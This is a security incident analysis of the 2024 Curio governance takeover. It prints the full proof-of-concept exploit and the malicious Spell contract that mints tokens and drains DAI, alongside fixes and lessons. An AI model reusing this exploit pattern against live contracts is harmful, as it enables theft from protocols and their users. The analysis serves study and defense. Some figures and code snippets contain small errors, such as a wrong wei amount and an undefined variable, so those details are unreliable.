# Curio Ecosystem Security Incident Analysis
**Governance Attack | ETH (Ethereum) | 2024-03-23 | Loss: ~$16,000,000**

---

## 1. Incident Overview

| Field | Details |
|------|------|
| Project | Curio Ecosystem (CurioDAO) |
| Chain | Ethereum Mainnet |
| Date | March 23, 2024 17:53:23 UTC |
| Loss | ~$16,000,000 (approximately 1 trillion CGT tokens illegally minted) |
| Vulnerability Type | Governance Attack — Voting Power Access Control Flaw |
| Attack Transaction | `0x4ff4028b03c3df468197358b99f5160e5709e7fce3884cc8ce818856d058e106` ([Etherscan](https://etherscan.io/tx/0x4ff4028b03c3df468197358b99f5160e5709e7fce3884cc8ce818856d058e106)) |
| Attacker Address | `0xdaAa6294C47b5743BDafe0613d1926eE27ae8cf5` ([Etherscan](https://etherscan.io/address/0xdaAa6294C47b5743BDafe0613d1926eE27ae8cf5)) |
| Attack Contract | `0x1E791527AEA32cDDBD7CeB7F04612DB536816545` ([Etherscan](https://etherscan.io/address/0x1E791527AEA32cDDBD7CeB7F04612DB536816545)) |
| Root Cause Summary | A voting power access control logic flaw in the MakerDAO DSChief fork-based governance system allowed an attacker to seize governance control with only a small amount of CGT tokens |

---

## 2. Vulnerability Details

### 2.1 Governance Voting Power Privilege Access Control Flaw

**Severity**: CRITICAL  
**CWE**: CWE-284 (Improper Access Control)

Curio Ecosystem implemented a fork of MakerDAO's governance system. MakerDAO's `DSChief` contract designates the governance leader (the address with the highest vote count) as the "hat," and only that address is permitted to call the `DSPause.plot()` function. However, Curio's implementation contained a **structural flaw where the governance leader position could be obtained via `lift()` with only a minimal amount of tokens — with no threshold validation**.

Specifically, the `DSChief.lift()` function replaces the current "hat" with an address that has received more votes. In a situation where actual governance participation was low after protocol initialization, **locking a trivial amount (20 CGT) of tokens, voting for oneself, and calling `lift()`** was sufficient to become the new hat and gain the right to call `DSPause.plot()`.

`DSPause.plot()` registers an arbitrary contract address and calldata, then executes a `delegatecall` to that address via `exec()`. The attacker exploited this to execute a `delegatecall` to a malicious `Spell` contract, performing arbitrary actions including minting 1 trillion CGT tokens and draining 1 billion DAI.

#### Vulnerable Code (❌)

```solidity
// DSChief.sol (MakerDAO fork — Curio implementation)
// Anyone with more votes than the current hat can call lift()
function lift(address whom) external {
    require(approvals[whom] > approvals[hat]);
    hat = whom;
}

// DSPause.sol
// Only the hat (governance leader) can call plot(), but
// the problem is that the hat itself can be obtained with very few tokens
function plot(
    address usr,
    bytes32 tag,
    bytes memory fax,
    uint256 eta
) external auth {
    // auth modifier: checks if msg.sender == hat
    // if delay=0, eta = block.timestamp allows immediate exec()
    require(eta >= add(now, delay));
    plans[soul(usr, tag, fax, eta)] = true;
}

function exec(
    address usr,
    bytes32 tag,
    bytes memory fax,
    uint256 eta
) external returns (bytes memory out) {
    require(plans[soul(usr, tag, fax, eta)]);
    require(now >= eta);
    delete plans[soul(usr, tag, fax, eta)];
    // executes delegatecall to the registered address — provides full execution context
    out = usr.delegatecall(fax);
    require(success);
}
```

**Key Issues**:
1. No minimum voting threshold (minimum quorum) in `DSChief`, allowing hat acquisition with a trivial token amount
2. `DSPause.delay` set to `0`, enabling immediate `exec()` after `plot()` (no timelock)
3. No parameter validation on the `Spell` contract's `act()` function, allowing delegation of arbitrary actions to arbitrary addresses

#### Secure Code (✅)

```solidity
// Improved DSChief.sol
uint256 public constant MINIMUM_QUORUM = 1_000_000 ether; // minimum 1M CGT

function lift(address whom) external {
    // must receive votes above the minimum threshold to become hat
    require(approvals[whom] > approvals[hat], "Insufficient approvals to lift");
    require(approvals[whom] >= MINIMUM_QUORUM, "Below minimum quorum");
    hat = whom;
}

// Improved DSPause.sol
uint256 public constant MIN_DELAY = 2 days; // minimum 2-day wait

constructor() {
    delay = MIN_DELAY; // enforce timelock
}

function setDelay(uint256 _delay) external auth {
    require(_delay >= MIN_DELAY, "Delay too short");
    delay = _delay;
}

// Spell contract — only whitelisted actions allowed
contract SafeSpell {
    mapping(address => bool) public whitelistedTargets;
    address public governance;

    function act(address user, IMERC20 cgt) public {
        // verify caller is the authorized pause contract
        require(msg.sender == address(pause), "Unauthorized caller");
        // cap maximum mintable amount
        uint256 maxMint = 1_000_000 ether; // maximum mint limit
        require(cgt.totalSupply() + maxMint <= MAX_SUPPLY, "Exceeds max supply");
        cgt.mint(user, maxMint);
    }
}
```

---

### 2.2 Missing Timelock

**Severity**: HIGH  
**CWE**: CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)

The `delay` value in the `DSPause` contract was set to `0`, allowing `exec()` to be called immediately after `plot()`. In any legitimate governance process, a minimum waiting period is essential to allow the community to review proposals and raise objections.

```solidity
// Vulnerable configuration (❌)
uint256 delay = 0; // allows immediate execution

// Secure configuration (✅)
uint256 delay = 2 days; // minimum 48-hour wait (or longer)
```

---

### 2.3 Unrestricted Token Minting via Arbitrary delegatecall

**Severity**: CRITICAL  
**CWE**: CWE-20 (Improper Input Validation)

`DSPause.exec()` executes a `delegatecall` to the registered Spell contract. This structure causes the Spell contract to operate within the execution context of `DSPause`. A malicious Spell could call `IVat.suck()` to manipulate the internal accounting system and use `IMERC20.mint()` to mint an unlimited amount of CGT tokens.

```solidity
// Malicious Spell contract (code used in the actual attack)
contract Spell {
    function act(address user, IMERC20 cgt) public {
        IVat vat = IVat(0x8B2B0c101adB9C3654B226A3273e256a74688E57);
        IJoin daiJoin = IJoin(0xE35Fc6305984a6811BD832B0d7A2E6694e37dfaF);

        // Create debt of 10^9 * 10^27 rad in the Vat (internal accounting)
        vat.suck(address(this), address(this), 10 ** 9 * 10 ** 18 * 10 ** 27);

        // Withdraw 1 billion DAI to the attacker
        vat.hope(address(daiJoin));
        daiJoin.exit(user, 10 ** 9 * 1 ether);

        // Mint 1 trillion CGT to the attacker
        cgt.mint(user, 10 ** 12 * 1 ether);
    }
}
```

---

## 3. Attack Flow

```
+-------------------+        +-------------------+        +-------------------+
|                   |        |                   |        |                   |
|  Attacker         |        |   DSChief          |        |   DSPause          |
|                   |        |   (Governance      |        |   (Timelock        |
|                   |        |    Leader Election)|        |    Module)         |
+-------------------+        +-------------------+        +-------------------+
        |                            |                            |
        | 1. lock() 20 CGT           |                            |
        |--------------------------->|                            |
        |                            |                            |
        | 2. vote([attacker])        |                            |
        |--------------------------->|                            |
        |                            |                            |
        | 3. lift(attacker)          |                            |
        |--------------------------->|                            |
        |   hat = attacker           |                            |
        |<---------------------------|                            |
        |                            |                            |
        | 4. Deploy malicious Spell contract                      |
        |                            |                            |
        | 5. plot(spell, tag, sig, now)                           |
        |-------------------------------------------------------->|
        |   plans[soul] = true       |                            |
        |<--------------------------------------------------------|
        |                            |                            |
        | 6. exec(spell, tag, sig, now)                           |
        |-------------------------------------------------------->|
        |                                     |                   |
        |                                     | delegatecall      |
        |                                     | act(attacker,cgt) |
        |                                     +------------------>+
        |                                                         |
        |                         +-------------------+          |
        |                         |  Vat (Accounting) |          |
        |                         +-------------------+          |
        |                         | suck() → create   |<---------+
        |                         |         debt       |          |
        |                         +-------------------+          |
        |                         |  Withdraw 1B DAI  |          |
        |                         +-------------------+          |
        |                         |  Mint 1T CGT      |          |
        |                         +-------------------+          |
        |                                                         |
        | 7. Mass sell CGT (DEX swaps)                            |
        |   - Swap to WETH, DAI, XCHF, etc. via Uniswap V2/V3    |
        |   - Cross-chain transfer (BNB, SKALE, Boba Network)     |
        |                                                         |
        | [Result] ~$16,000,000 stolen                            |
```

**Step-by-step Description**:

1. **CGT Token Acquisition and Locking**: The attacker acquires a small amount of CGT tokens (approximately 20, 2e18 wei) and calls `DSChief.lock(20 ether)` to lock them.

2. **Self-Vote**: Calls `DSChief.vote([attacker_address])` to assign 20 CGT worth of voting power to their own address.

3. **Governance Leader (hat) Hijack**: Calls `DSChief.lift(attacker_address)`. If the current hat has fewer votes, or if no hat has been set, the attacker becomes the new hat. This grants the `auth` privilege to call `DSPause.plot()`.

4. **Malicious Spell Contract Deployment**: Deploys a malicious `Spell` contract that executes `IVat.suck()` and `IMERC20.mint()`. Computes the contract's `extcodehash` to use as the `tag`.

5. **Register Malicious Spell (plot)**: Calls `DSPause.plot(spell_addr, tag, calldata, block.timestamp)`. With `delay=0`, setting `eta = block.timestamp` enables immediate execution.

6. **Execute Malicious Spell (exec)**: Calls `DSPause.exec(spell_addr, tag, calldata, eta)`. `DSPause` performs a `delegatecall` to `Spell.act()`, which:
   - `Vat.suck()`: Creates debt equivalent to 1 billion DAI in the internal accounting system
   - `daiJoin.exit()`: Withdraws 1 billion DAI to the attacker's address
   - `cgt.mint()`: Mints 1 trillion CGT to the attacker's address

7. **Asset Liquidation and Obfuscation**: Swaps large quantities of CGT for WETH, DAI, XCHF, 1INCH, UNI, LINK, SKL, and other tokens via Uniswap V2/V3 routers. Assets are then transferred cross-chain via Omni Bridge, SKALE Bridge, and Boba Bridge to complicate tracing.

---

## 4. PoC Code Analysis

DeFiHackLabs `CGT_exp.sol` (Forge test-based PoC):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo -- Total Lost : ~998B(cgt token)
// TX : https://app.blocksec.com/explorer/tx/eth/0x4ff4028b...
// Attacker : https://etherscan.io/address/0xdaaa6294...
// Attack Contract : https://etherscan.io/address/0x1e791527...

contract ContractTest is Test {
    IDSChief chief = IDSChief(0x579A3244f38112b8AAbefcE0227555C9b6e7aaF0);
    IDSPause pause = IDSPause(0x1e692eF9cF786Ed4534d5Ca11EdBa7709602c69f);
    IERC20 cgt = IERC20(0xF56b164efd3CFc02BA739b719B6526A6FA1cA32a);
    // ... (other token and router addresses)
    Spell spell;

    function setUp() external {
        // create mainnet fork at block 19,498,910
        cheats.createSelectFork("mainnet", 19_498_910);
        // fund test contract with 80 CGT
        deal(address(cgt), address(this), 80 ether);
    }

    function testExploit() external {
        attack();
        // print attack results
        emit log_named_decimal_uint("[End] Attacker CGT after exploit",
            cgt.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker dai after exploit",
            dai.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker weth after exploit",
            weth.balanceOf(address(this)), 18);
    }

    function attack() public {
        // Step 1: Seize governance system
        cgt.approve(address(chief), type(uint256).max);
        chief.lock(20 ether);                  // lock 20 CGT
        address[] memory yays = new address[](1);
        yays[0] = address(this);
        chief.vote(yays);                      // vote for self
        chief.lift(address(this));             // obtain hat (governance leader)

        // Step 2: Deploy and register malicious Spell
        spell = new Spell();
        address spelladdr = address(spell);
        bytes32 tag;
        assembly {
            tag := extcodehash(spelladdr)      // contract code hash
        }
        uint256 delay = block.timestamp + 0;   // exploit delay=0: immediate execution
        bytes memory sig = abi.encodeWithSignature(
            "act(address,address)",
            address(this),
            address(cgt)
        );

        // Step 3: Register and execute malicious Spell
        pause.plot(address(spell), tag, sig, delay);  // register governance proposal
        pause.exec(address(spell), tag, sig, delay);  // execute immediately (delegatecall)

        // Step 4: Liquidate assets via DEX
        _swap0();  // CGT → WETH/DAI/XCHF/1INCH/UNI/LINK/SKL
        _swap1();  // XCHF/1INCH/UNI/LINK → DAI (V3 router)
    }
}

// Malicious Spell contract — executed in delegatecall context
contract Spell {
    function act(address user, IMERC20 cgt) public {
        IVat vat = IVat(0x8B2B0c101adB9C3654B226A3273e256a74688E57);
        IJoin daiJoin = IJoin(0xE35Fc6305984a6811BD832B0d7A2E6694e37dfaF);

        // Core vulnerability 1: Manipulate Vat internal accounting — create 10^9 DAI debt
        vat.suck(address(this), address(this), 10 ** 9 * 10 ** 18 * 10 ** 27);

        // Core vulnerability 2: Illegally withdraw 1 billion DAI
        vat.hope(address(daiJoin));
        daiJoin.exit(user, 10 ** 9 * 1 ether);

        // Core vulnerability 3: Illegally mint 1 trillion CGT
        cgt.mint(user, 10 ** 12 * 1 ether);
    }
}
```

**PoC Code Analysis Summary**:

| Step | Function | Description |
|------|------|------|
| 1 | `chief.lock(20e18)` | Acquire voting power with only 20 CGT |
| 2 | `chief.vote([self])` | Vote for self |
| 3 | `chief.lift(self)` | Hijack governance leader (hat) |
| 4 | `new Spell()` | Deploy malicious execution contract |
| 5 | `pause.plot(...)` | Register malicious proposal (delay=0) |
| 6 | `pause.exec(...)` | Immediate execution → delegatecall |
| 7 | `vat.suck(...)` | Manipulate internal accounting (create DAI debt) |
| 8 | `cgt.mint(...)` | Illegally mint 1 trillion CGT |
| 9 | `_swap0()/_swap1()` | Liquidate assets via DEX |

---

## 5. CWE Classification

| CWE ID | Vulnerability Name | Affected Component | Severity |
|--------|---------|-------------|--------|
| CWE-284 | Improper Access Control | DSChief — missing minimum threshold in `lift()` | CRITICAL |
| CWE-20 | Improper Input Validation | DSPause — allows registration of arbitrary Spell contracts | CRITICAL |
| CWE-362 | Race Condition / Insufficient Timelock | DSPause — `delay = 0` setting | HIGH |
| CWE-269 | Improper Privilege Management | Weak design of DSChief → DSPause privilege chain | HIGH |
| CWE-693 | Protection Mechanism Failure | Missing governance quorum validation | HIGH |
| CWE-664 | Improper Control of a Resource Through its Lifetime | IVat — unrestricted calls to `suck()` function | CRITICAL |

---

## 6. Reproducibility Assessment

### Reproduction Difficulty: **LOW** — Reproducible by anyone

| Item | Assessment |
|------|------|
| Initial Capital Required | Negligible (20 CGT) |
| Technical Complexity | Medium (basic Solidity knowledge + understanding of DSChief/DSPause) |
| Special Tools Required | None |
| Multiple Transactions | Not required (completes within a single transaction) |
| Flash Loan Required | Not required |
| MEV Bot Competition | None |

**Detailed Reproducibility Assessment**:

The attack is highly reproducible. The attacker only needs to hold a small amount (20 CGT) of governance tokens. This is due to the following reasons:

1. **No Minimum Threshold**: The protocol has no minimum voter participation rate (quorum) for governance decisions. This means anyone who receives even 1 wei more votes than the current hat address can become the hat.

2. **Immediate Execution**: The `delay = 0` setting allows `plot()` and `exec()` to be called in consecutive transactions within the same block. The community has zero time to respond.

3. **Unrestricted Authority**: Once the hat position is acquired, completely arbitrary code can be executed via `DSPause.plot()`. The Vat's `suck()` function could be called without authorization, allowing complete manipulation of the internal accounting system.

4. **Single Transaction**: The entire attack completes within a single transaction in block 19,498,911, making it safely executable without frontrunning risk when leveraging MEV infrastructure such as Flashbots.

**Forge Reproduction Command**:
```bash
forge test --match-test testExploit \
  --fork-url <MAINNET_RPC> \
  --fork-block-number 19498910 \
  -vv
```

---

## 7. Remediation

### Immediate Actions

**7.1 Pause Governance System**
- Suspend all external calls to `DSChief` and `DSPause` contracts
- Freeze protocol state via emergency multisig
- Temporarily disable new token minting functionality

**7.2 Damage Assessment and Disclosure**
- Compile list of addresses holding illegally minted CGT and apply on-chain blacklist
- Track stolen assets cross-chain (Omni Bridge, SKALE Bridge, Boba Bridge)
- Immediately notify CEXs to request freezing of attacker assets

**7.3 CGT 2.0 Migration**
- Invalidate CGT tokens used in the attack and issue new CGT 2.0 tokens
- 1:1 airdrop to existing holders based on pre-attack snapshot
- Develop and publish a 100% loss compensation plan

---

### Long-Term Improvements

**7.4 Governance Quorum Enforcement**

```solidity
// introduce minimum governance participation threshold
uint256 public constant MINIMUM_QUORUM = totalSupply * 5 / 100; // 5% of total supply

function lift(address whom) external {
    require(approvals[whom] > approvals[hat], "Not enough votes");
    require(approvals[whom] >= MINIMUM_QUORUM, "Quorum not met");
    hat = whom;
}
```

**7.5 Enforce Timelock**

```solidity
uint256 public constant MINIMUM_DELAY = 2 days;

constructor() {
    // delay cannot be set to 0
    delay = MINIMUM_DELAY;
}

function setDelay(uint256 newDelay) external auth {
    require(newDelay >= MINIMUM_DELAY, "Delay too short");
    delay = newDelay;
}
```

**7.6 Introduce Spell Contract Whitelist**

```solidity
mapping(bytes32 => bool) public approvedSpells;

// only pre-approved Spells via a separate multisig can be registered
function approveSpell(bytes32 spellHash) external onlyMultisig {
    approvedSpells[spellHash] = true;
}

function plot(address usr, bytes32 tag, ...) external auth {
    require(approvedSpells[keccak256(abi.encodePacked(usr, tag))],
        "Spell not approved");
    // ...
}
```

**7.7 Separate Token Minting Authority (Separation of Concerns)**

```solidity
// Separate CGT token minting authority into a dedicated role
// Design so that mint() cannot be called from DSPause's delegatecall context

contract CGTToken is ERC20 {
    address public immutable MINTER;  // single minter fixed at deployment
    uint256 public constant MAX_MINT_PER_TX = 1_000_000 ether;
    uint256 public constant TOTAL_MAX_SUPPLY = 100_000_000 ether;

    constructor(address minter) {
        MINTER = minter;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == MINTER, "Not authorized to mint");
        require(amount <= MAX_MINT_PER_TX, "Exceeds per-tx limit");
        require(totalSupply() + amount <= TOTAL_MAX_SUPPLY, "Exceeds max supply");
        _mint(to, amount);
    }
}
```

**7.8 Build On-Chain Monitoring System**

- Detect abnormal voting patterns using Forta, OpenZeppelin Defender, etc.
- Establish an immediate alerting system triggered by hat change events
- Integrate Slack/Telegram alerts for `plot()`/`exec()` calls

**7.9 Conduct Regular Security Audits**

- Mandate external security audits on a quarterly basis
- Require diff review against original code whenever forking governance contracts
- Maintain an ongoing bug bounty program

---

## 8. Lessons Learned

### 8.1 Dangers of MakerDAO Forks

Curio Ecosystem forked MakerDAO's battle-tested governance codebase, but **deployed it without sufficiently understanding the underlying assumptions of the original system**. MakerDAO's DSChief/DSPause system was designed assuming a large community with guaranteed high voter participation and an appropriately configured `delay`.

However, in Curio's small ecosystem:
- Governance participants were nearly absent, meaning the current hat's vote count was extremely low or no hat had been set at all.
- Setting `delay = 0` completely negated the security benefit of the timelock.
- The lack of a community monitoring system meant the attack could not be detected in advance.

**Lesson**: Forking open-source code is not merely copying code — it requires understanding and re-validating the security assumptions underlying the original design.

### 8.2 Violation of the Principle of Least Privilege

The `delegatecall` structure of `DSPause.exec()` grants excessive authority to Spell contracts. This mechanism, which allows calling arbitrary functions with arbitrary data, inherently permits unlimited authority without prior validation.

**Lesson**: The scope of actions permitted by governance mechanisms must be minimized. Governance structures that allow arbitrary code execution require the highest level of security review.

### 8.3 Timelock Is a Necessity, Not an Option

In DeFi governance, a timelock is the only means by which the community can detect and respond to malicious proposals. Setting `delay = 0` completely eliminates this line of defense.

**Lesson**: Governance execution delays must be at least 48 hours (72 hours or more recommended), and this value must be designed so it cannot be modified without going through the governance process itself.

### 8.4 The Dual Role of Governance Tokens

CGT was not merely a value-storage token — it was the mechanism that determined complete control over the protocol. However, token decentralization and holder participation rates were extremely low, making it possible to dominate governance with only a small number of tokens.

**Lesson**: Governance token design must include multi-layered defenses such as minimum quorum requirements, voting periods, and objection periods.

### 8.5 Access Control of the Vat Internal Accounting System

The attacker was able to call `IVat.suck()` to manipulate the protocol's internal accounting because the `suck()` function's authority had been granted to DSPause (or its delegate). This demonstrates a composability risk where a single vulnerability cascades to affect other systems.

**Lesson**: The privilege structure between DeFi protocol components must be reviewed holistically, and each component must be designed to hold only the minimum permissions necessary.

### 8.6 Trace Evasion via Cross-Chain Asset Movement

The attacker swapped CGT tokens on Uniswap V2/V3 for a variety of tokens including WETH, DAI, XCHF, 1INCH, UNI, and LINK, then distributed the assets across multiple chains via Omni Bridge, SKALE Bridge, and Boba Bridge. This represents a sophisticated money laundering pattern that makes on-chain forensics extremely difficult.

**Lesson**: When a large-scale governance attack occurs, real-time cross-chain monitoring and a rapid CEX notification system are critical to minimizing damage.

---

## References

- [Halborn: Explained: The Curio Hack (March 2024)](https://www.halborn.com/blog/post/explained-the-curio-hack-march-2024)
- [Neptune Mutual: Analysis of the Curio Exploit](https://medium.com/neptune-mutual/analysis-of-the-curio-exploit-1df31252fe66)
- [CurioDAO Recovery Plan — Medium](https://investcurio.medium.com/curiodaos-recovery-plan-1255427f35de)
- [Rekt News: Curio](https://rekt.news/curio-rekt)
- [The Block: Curio $16M Exploit](https://www.theblock.co/post/284405/curio-exploit-16-million-usd)
- [DeFiHackLabs PoC: CGT_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/CGT_exp.sol)
- [BlockSec Explorer: Attack Transaction](https://app.blocksec.com/explorer/tx/eth/0x4ff4028b03c3df468197358b99f5160e5709e7fce3884cc8ce818856d058e106)
- [Etherscan: Attacker Address](https://etherscan.io/address/0xdaAa6294C47b5743BDafe0613d1926eE27ae8cf5)
- [Etherscan: Attack Contract](https://etherscan.io/address/0x1E791527AEA32cDDBD7CeB7F04612DB536816545)